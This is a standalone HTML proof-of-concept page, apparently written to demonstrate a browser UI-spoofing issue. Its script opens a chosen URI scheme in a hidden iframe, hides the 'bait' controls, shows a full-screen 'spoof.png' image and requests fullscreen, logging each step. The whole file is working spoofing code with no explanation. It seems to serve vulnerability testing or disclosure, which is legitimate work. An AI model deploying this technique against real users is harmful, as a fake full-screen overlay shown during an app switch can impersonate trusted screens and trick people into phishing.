<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"
    />
    <title>tester-diag-schemes</title>
    <style>
      html,
      body {
        margin: 0;
        padding: 0;
        width: 100%;
        height: 100%;
        overflow: hidden;
        overscroll-behavior: none;
        touch-action: none;
        background: #fff;
        text-align: center;
        font-family: sans-serif;
      }
      #spoof {
        display: none;
        position: fixed;
        inset: 0;
        width: 100%;
        height: 100%;
        object-fit: cover;
        transform: translateZ(0);
        backface-visibility: hidden;
        user-select: none;
        -webkit-user-select: none;
        pointer-events: none;
      }
      #bait {
        position: fixed;
        inset: 0;
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        gap: 12px;
      }
      select,
      button {
        padding: 12px 20px;
        font-size: 16px;
        cursor: pointer;
        touch-action: manipulation;
      }
    </style>
  </head>
  <body>
    <img id="spoof" src="spoof.png" alt="spoof" decoding="sync" />

    <div id="bait">
      <h2>Scheme &amp; Fullscreen Diag</h2>
      <label for="schemeSelect">Target URI Scheme:</label>
      <select id="schemeSelect">
        <option value="geo:0,0?q=test">geo: (geo:0,0?q=test)</option>
        <option value="tel:000000">tel: (tel:000000)</option>
        <option value="mailto:test@example.invalid">mailto: (mailto:test@example.invalid)</option>
        <option value="sms:000000">sms: (sms:000000)</option>
      </select>
      <button id="btn">run test</button>
    </div>

    <script>
      const btn = document.getElementById("btn");
      const schemeSelect = document.getElementById("schemeSelect");
      const bait = document.getElementById("bait");
      const spoof = document.getElementById("spoof");

      const logEvent = (label, extra = "") => {
        const ts = performance.now().toFixed(2);
        console.info(`[PoC +${ts}ms] ${label}`, extra);
      };

      spoof.addEventListener("load", () => {
        logEvent("spoof image loaded", `${spoof.naturalWidth}x${spoof.naturalHeight}`);
      });

      spoof.addEventListener("error", () => {
        logEvent("spoof image failed to load");
      });

      document.addEventListener("fullscreenchange", () => {
        logEvent("fullscreenchange", `activeElement=${document.fullscreenElement?.id || "none"}`);
      });

      document.addEventListener("fullscreenerror", (err) => {
        logEvent("fullscreenerror", err?.type || "unknown");
      });

      document.addEventListener("visibilitychange", () => {
        logEvent("visibilitychange", `visibilityState=${document.visibilityState}`);
      });

      window.addEventListener("blur", () => {
        logEvent("window blur");
      });

      window.addEventListener("focus", () => {
        logEvent("window focus");
      });

      btn.addEventListener("click", () => {
        const chosenUri = schemeSelect.value;
        logEvent("click received", `uri=${chosenUri}`);

        const frame = document.createElement("iframe");
        frame.style.display = "none";
        frame.src = chosenUri;
        document.body.appendChild(frame);
        logEvent("scheme iframe appended", chosenUri);

        bait.style.display = "none";
        spoof.style.display = "block";
        logEvent("dom visibility toggled");

        if (document.documentElement.requestFullscreen) {
          document.documentElement
            .requestFullscreen()
            .then(() => logEvent("requestFullscreen resolved"))
            .catch((err) => logEvent("requestFullscreen rejected", err?.message || String(err)));
        } else {
          logEvent("requestFullscreen unsupported");
        }
      });
    </script>
  </body>
</html>
